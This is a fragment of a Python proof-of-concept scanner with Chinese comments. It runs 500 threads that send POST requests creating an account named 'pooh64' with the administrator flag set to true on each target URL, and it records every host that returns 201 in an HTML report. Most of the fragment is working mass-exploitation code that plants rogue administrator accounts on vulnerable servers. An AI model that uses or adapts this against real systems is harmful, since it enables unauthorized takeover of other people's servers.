...
sem = threading.Semaphore(500) #執行緒數量
bar_len = 60 #進度條長度
...
def url200(url,origin_url): #POC執行本體
    ...
    try:            
        ...
        data = """{"username":"pooh64","email":"pooh64@gmail.com","realname":"pooh64","password":"1qaz@WSX","comment":"1","has_admin_role":true}"""
        r = requests.post(url=url, headers=headers, data=data, verify=False, timeout=5)
        if r.status_code == 201 :  #條件式
            success += 1  #條件成立成功數+1          
            body = """<br>            
            <a href="%s" target="_blank">%s </a>
            """%(origin_url,origin_url)  #html寫入
            doc.write(body) 
